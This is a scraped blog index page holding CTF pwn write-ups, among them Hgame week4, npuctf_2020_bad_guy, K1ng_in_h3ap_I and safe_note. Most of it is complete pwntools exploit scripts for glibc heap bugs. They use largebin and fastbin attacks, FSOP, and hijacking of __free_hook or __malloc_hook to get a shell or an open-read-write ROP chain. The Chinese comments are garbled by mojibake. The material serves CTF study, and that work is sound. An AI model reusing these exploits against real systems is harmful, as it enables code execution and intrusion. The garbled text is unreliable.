add(1,0x550) #fake_chain å¯æ§å¤§å †å—
add(2,0x600)
add(3,0x540) #å°å †å—
add(4,0x600)


### leak libc_addr
delete(1)
show(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1f6cc0
tmp=leak_addr+0x1f6cc0+0x4b0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
###

pop_rdi=leak_addr+0x23ba5
pop_rsi=leak_addr+0x251fe
pop_rdx_rbx=leak_addr+0x8bbb9
pop_rax=leak_addr+0x3f923
ret=leak_addr+0x22d19
_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+0x3d
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
magic_gadget=leak_addr+0x160cb6
&#39;&#39;&#39;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&#39;&#39;&#39;


### leak heap_addr 
add(5,0x900) #fake_jump 0x1f70
edit(1,b&amp;quot;a&amp;quot;*0xf+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x8a0
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))


### largebin attack
delete(3)
edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all-0x20))
add(6,0x900)
###
add(7,0x540) #å°†å°å †å—ç”³è¯·å‡ºæ¥ï¼Œè¿›è¡Œunlinkï¼Œä½¿å¾—_IO_list_all_chainçš„åœ°å€æ˜¯å¯æ§çš„å¤§å †å—çš„åœ°å€ï¼Œå¦åˆ™ä¼ªé€ fake_fileåœ°å€éæ³•


# å¯¹fpçš„è®¾ç½®å¦‚ä¸‹ï¼š
# _flagsè®¾ç½®ä¸º~(2 | 0x8 | 0x800)ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶rdiï¼Œè®¾ç½®ä¸º0å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—shellï¼Œå¯è®¾ç½®ä¸ºsh;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼
# vtableè®¾ç½®ä¸º_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmapåœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨_IO_wfile_overflowå³å¯
# _wide_dataè®¾ç½®ä¸ºå¯æ§å †åœ°å€Aï¼Œå³æ»¡è¶³*(fp + 0xa0) = A
# _wide_data-&amp;gt;_IO_write_baseè®¾ç½®ä¸º0ï¼Œå³æ»¡è¶³*(A + 0x18) = 0
# _wide_data-&amp;gt;_IO_buf_baseè®¾ç½®ä¸º0ï¼Œå³æ»¡è¶³*(A + 0x30) = 0
# _wide_data-&amp;gt;_wide_vtableè®¾ç½®ä¸ºå¯æ§å †åœ°å€Bï¼Œå³æ»¡è¶³*(A + 0xe0) = B
# _wide_data-&amp;gt;_wide_vtable-&amp;gt;doallocateè®¾ç½®ä¸ºåœ°å€Cç”¨äºåŠ«æŒRIPï¼Œå³æ»¡è¶³*(B + 0x68) = C


#edit _flags ~(2 | 0x8 | 0x800)
# edit(0,b&amp;quot;\x00&amp;quot;*0x600+p64((~(2 | 0x8 | 0x800))&amp;amp;0xffffffffffffffff))

#fake_wide_data
fake_wide_data=heap_addr+0x2a0
flag_addr=heap_addr+0x2a0

edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))
fake_jump=heap_addr+0x1f70


_wide_data=b&amp;quot;./flag\x00\x00&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(0,_wide_data)


# gdb.attach(io)
# pause()


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(write_a)

payload=p64(setcontext_61)+p64(fake_jump-0x10)*10+p64(magic_gadget) #C -&amp;gt; magic_gadget
payload+=b&amp;quot;\x00&amp;quot;*0x20+p64(heap_addr+0x2010) #orw_addr
payload+=p64(ret)+orw
#è¿™ä¸€å¨ä¹‹æ‰€ä»¥è¡Œï¼Œé¦–å…ˆfake_wide_dataè®¾ç½®çš„fake_jump+0x68è·³è½¬æ‰§è¡Œmagic_gadget
#å½“æˆ‘ä»¬editæ—¶ï¼Œå…¶ä¸­çš„readå‡½æ•°å°†è¯»å…¥çš„æ•°æ®åœ°å€å­˜åˆ°raxå¯„å­˜å™¨ä¸­äº†ï¼Œåˆ™rdxå¯„å­˜å™¨çš„å€¼å˜ä¸º[rax+0x38]ï¼Œå³fake_jump-0x10å¤„
#æ­¤æ—¶call qword ptr [rdx + 0x20]å…¶å®è°ƒç”¨çš„æ˜¯setcontext+61,å¹¶ä¸”æ­¤æ—¶rspå€¼ä¸º[rdx+0xa0]ï¼Œå³heap_addr+0x1d10
#heap_addr+0x1d10çš„åœ°å€å³ä¸ºorwçš„åœ°å€ï¼Œretç­‰æ•ˆpop ripï¼Œä»è€Œæ‰§è¡Œorw


edit(5,payload)
exit()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Hgame week4 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DLuwxEhs1/"" data-c="
          &lt;p&gt;ä¸€é“å †é£æ°´é¢˜ç›®ï¼Œ10æ¬¡add&lt;br&gt;
æ¯æ¬¡åªèƒ½ç”³è¯·0x100æˆ–0x60å¤§å°å †å—&lt;br&gt;
å­˜åœ¨&lt;code&gt;bargain&lt;/code&gt;å‡½æ•°å¯ä»¥ä¿®æ”¹fdï¼ˆåšå‡æ³•ï¼Œé™åˆ¶å¤§å°0x10ï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°åå‘ä¿®æ”¹&lt;br&gt;
é‡ç‚¹åœ¨äºæ„é€ tcacheé“¾å®ç°ä»»æ„åœ°å€ç”³è¯·    (&lt;s&gt;å¤´å¤§&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28973)
io=process(&amp;quot;./gift&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;gift!\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def edit_off(n,s):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(s))

gdb.attach(io)
pause()

add(1,b&amp;quot;\x00&amp;quot;) #0x100 0
add(1,b&amp;quot;\x00&amp;quot;) #0x100 1
delete(0)
delete(1)

show(1)
io.recvuntil(b&amp;quot;cost: &amp;quot;)
heap_addr=int(io.recv(14),10)-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(1,cyclic(0x10)+p64(heap_addr+0x400)+cyclic(0x68)+p64(heap_addr+0x410)) #1
add(1,p64(heap_addr+0x390)) #0

delete(0)
delete(1)
edit_off(1,-0x10)

add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)

delete(0)
show(0)

io.recvuntil(b&amp;quot;cost: &amp;quot;)
leak_addr=int(io.recv(16),10)-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

add(1,p64(free_hook-0x10))
add(1,b&amp;quot;\x00&amp;quot;)
add(1,p64(shell))

delete(1)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[å·…å³°æå®¢ 2022]Gift wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gnmApmq5l/"" data-c="
          &lt;h3 id=&#34;npuctf_2020_bad_guy&#34;&gt;npuctf_2020_bad_guy&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡åš&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;æ³„éœ²libcçš„é¢˜&lt;br&gt;
64ä½ï¼Œä¸èƒ½æ­£å¸¸dumpå‡ºlibcåŸºå€ï¼Œè€ƒè™‘å°†å †å—ç”³è¯·åˆ°&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;å¤„ä¿®æ”¹&lt;code&gt;_flags&lt;/code&gt;å’Œ&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;æ³„éœ²libc&lt;br&gt;
ç”±äºeditå †æº¢å‡ºï¼Œä¿®æ”¹unsortedbin fdæŒ‡é’ˆï¼ˆçˆ†ç ´ä½äºŒå­—èŠ‚ï¼‰ååˆ†é…0x10å¤§å°å †å—ä½¿å‰©ä½™å †å—è¿›å…¥fastbinï¼Œç”³è¯·å †å—åˆ°&lt;code&gt;_IO_2_1_stdout_-0x43&lt;/code&gt;å¤„ï¼ˆæ­¤å¤„0x7fè·Ÿfastbin attackä¼ªé€ fake chunkåŒç†&lt;br&gt;
æ­¤æ—¶ä¿®æ”¹&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;å’Œ&lt;code&gt;_flags&lt;/code&gt;ï¼Œ&lt;code&gt;_flags&lt;/code&gt;ä¿®æ”¹ä¸º&lt;code&gt;0xfbad1887&lt;/code&gt;å³å¯ç»•è¿‡æ‰€æœ‰æ£€æŸ¥ï¼Œ&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;ä½ä½è¦†ç›–ä¸º&lt;code&gt;\x00&lt;/code&gt;å³å¯ï¼Œä¿è¯&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;å°äº&lt;code&gt;_IO_2_1_write_ptr&lt;/code&gt;&lt;br&gt;
ä¹‹åä»»æ„æ‰§è¡Œä¸€æ¬¡&lt;code&gt;puts&lt;/code&gt;å‡½æ•°å³å¯æ³„éœ²libcåŸºå€&lt;br&gt;
æœ€ååˆ©ç”¨æ³„éœ²çš„libcåŸºå€ï¼ŒåŠ«æŒåˆ©ç”¨fastbin attackåŠ«æŒ&lt;code&gt;malloc_hook&lt;/code&gt;æ‰“one_gadgetå³å¯&lt;br&gt;
æ³¨æ„æ­¤é¢˜çš„glibcç‰ˆæœ¬ä¸º&lt;code&gt;2.23-0ubuntu11&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25428)
io=process(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
elf=ELF(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
gdb.attach(io)
pause()  
    
add(0,0x10,b&amp;quot;aaa&amp;quot;)
add(1,0x10,b&amp;quot;bbb&amp;quot;)
add(2,0x60,b&amp;quot;ccc&amp;quot;)
add(3,0x10,b&amp;quot;ddd&amp;quot;)

delete(2)

payload=cyclic(0x18)+p64(0x91)
edit(0,len(payload),payload)

delete(1)

add(4,0x10,b&amp;quot;bbb&amp;quot;)

payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
edit(4,len(payload),payload)

add(5,0x60,b&amp;quot;eee&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;

add(6,0x60,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+one_gadget[3]

add(7,0x60,b&amp;quot;aaa&amp;quot;)
delete(7)

payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(4,len(payload),payload)

add(8,0x60,b&amp;quot;qqq&amp;quot;)
add(9,0x60,cyclic(0x13)+p64(shell))
# add(7,0x60,b&amp;quot;ooo&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index :&amp;quot;,b&amp;quot;7&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;18&amp;quot;)

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2021-é•¿åŸæ¯_é™¢æ ¡ç»„k1ng_in_h3ap_i&#34;&gt;[2021 é•¿åŸæ¯_é™¢æ ¡ç»„]K1ng_in_h3ap_I&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨æ³„éœ²çš„printfçš„åŸºå€æ¨ç®—å¤„stdout-0x43å¤„åœ°å€ï¼Œä¿®æ”¹fastbin fdä½3å­—èŠ‚æ‰“fastbin attack&lt;br&gt;
ç„¶ååˆ©ç”¨&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;æ³„éœ²libc&lt;br&gt;
æœ€åreallocè°ƒæ ˆæ‰“one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28714)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;context:\n&amp;quot;,cc)
    
def mg():
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;666&amp;quot;)

# gdb.attach(io)
# pause()

mg()
io.recvuntil(b&amp;quot;0x&amp;quot;)
low_bytes=int(io.recv(6),16)
print(&amp;quot;low bytes: &amp;quot;+hex(low_bytes))
stdout=low_bytes+0x36fe10
print(&amp;quot;stdout: &amp;quot;+hex(stdout))

add(0,0x60)
add(1,0x90)
add(2,0x60)
add(3,0x60)

delete(1)
add(4,0x60)
edit(4,p64(stdout-0x43)[:3])
delete(0)
delete(2)
edit(2,b&amp;quot;\x70&amp;quot;)

add(5,0x60)
add(6,0x60)
add(7,0x60)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(7,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(8,0x60)
delete(3)
edit(3,p64(malloc_hook-0x23))
add(9,0x60)
add(10,0x60)
edit(10,cyclic(0xb)+p64(shell)+p64(realloc+0xc))

delete(9)
add(9,0x60)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">ä¸¤é“fastbin attack+_IO_2_1_stdout_</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9EpvUJ1LN0/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h2&gt;
&lt;h3 id=&#34;safe_note&#34;&gt;safe_note:&lt;/h3&gt;
&lt;p&gt;2.32åŠ å…¥çš„å¼‚æˆ–åŠ å¯†&lt;br&gt;
&lt;code&gt;e-&amp;gt;next = PROTECT_PTR (&amp;amp;e-&amp;gt;next, tcache-&amp;gt;entries[tc_idx])&lt;/code&gt;&lt;br&gt;
PROTECT_PTRæ“ä½œå°±æ˜¯å…ˆå¯¹posï¼ˆnextåŸŸçš„å †å—åœ°å€ï¼‰å³ç§»äº†12ä½ï¼Œå†å°†ä¸åŸå…ˆçš„æŒ‡é’ˆï¼ˆåœ¨æ­¤ç‰ˆæœ¬ä¹‹å‰fd/nextå‚¨å­˜çš„å†…å®¹ï¼‰å¼‚æˆ–å¾—åˆ°çš„ç»“æœå­˜å…¥nextã€‚&lt;br&gt;
å½“fastbinæˆ–tcachebinåªæœ‰1ä¸ªchunkæ—¶ï¼Œnextçš„å€¼ä¸º0ï¼Œæ­¤æ—¶&lt;code&gt;(pos&amp;gt;&amp;gt;12)^0==(pos&amp;gt;&amp;gt;12)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define PROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) &amp;gt;&amp;gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;amp;ptr, ptr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦å¤–æ³„éœ²çš„&lt;code&gt;main_arena+0x60&lt;/code&gt;å¤„çš„åœ°å€æœ€é«˜ä½ä¸º&lt;code&gt;\x00&lt;/code&gt;éœ€è¦è¦†ç›–ä¸ºå…¶ä»–å€¼æ³„éœ²&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28133)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
edit(7,b&amp;quot;&amp;quot;)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]-0xa
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))
      
free_hook_key=free_hook^key
edit(6,p64(free_hook_key))

# gdb.attach(io)
# pause()

add(9,0x90)
edit(9,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x90)
edit(10,p64(sys_addr))

delete(9)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;large_note&#34;&gt;large_note:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#æ³¨æ„0x10å­—èŠ‚å¯¹é½
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uafæ³„éœ²libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #å°†chunk0åˆ†é…åˆ°largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #æ³¨æ„æ£€æŸ¥ï¼Œä¿®æ”¹chunk 0çš„bk_nextsizeä¸ºtc_max_bins - 0x20å¤„ï¼Œæ¥è¾¾åˆ°ä»»æ„åœ°å€å†™ä¸€ä¸ªå †å—åœ°å€

edit(0,payload)

delete(2) #åˆ†é…chunk2 åˆ°unsortedbin

add(15,0x900) #åˆ†é…ä¸€ä¸ªå¤§å †å—å‡ºå‘largebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #å›ºå®šåç§»
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #åŠ«æŒfree_hookä¸ºsystemå‡½æ•°ï¼Œfreeæ‰&amp;quot;/bin/sh&amp;quot;å †å—å³å¯

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;note_context&#34;&gt;note_context:&lt;/h3&gt;
&lt;p&gt;largebin attack+mp_.tcache_bins+setcontext&lt;br&gt;
ä¸Šä¸€é“large_noteè·Ÿç€å®˜æ–¹wpèµ°æœ‰ä¸å°‘ç–‘æƒ‘ï¼Œä¸å¾—ä¸åæ§½ä¸€ä¸‹è®©äººäº‘é‡Œé›¾é‡Œçš„&lt;br&gt;
è¿™é“é¢˜è®¤çœŸçš„èµ°äº†ä¸€éæµç¨‹ï¼Œè§£å†³äº†ä¸€äº›ç–‘æƒ‘&lt;br&gt;
å¼€å¯æ²™ç›’ï¼Œç¦ç”¨&lt;code&gt;execve&lt;/code&gt;å’Œ&lt;code&gt;execveat&lt;/code&gt;ï¼Œæ‰“orw&lt;br&gt;
èœå•é¢˜åŠŸèƒ½é½å…¨ï¼Œä½†æ˜¯ç”³è¯·å †å—å¤§å°èŒƒå›´åœ¨largebinä¸­&lt;br&gt;
æœ¬é¢˜æ”»å‡»&lt;code&gt;mp_.tcache_bins&lt;/code&gt;ï¼Œlargebin attackå®ç°ä»»æ„åœ°å€å†™&lt;br&gt;
å¯ä»¥ç”³è¯·åˆ°&lt;code&gt;mp_.tcache_bins&lt;/code&gt;å¤„ï¼Œæ­¤æ—¶å¯è§ä¸€ä¸ªå †åœ°å€è¦†ç›–äº†åŸæ¥çš„0x40(tcachebinæ•°é‡)&lt;br&gt;
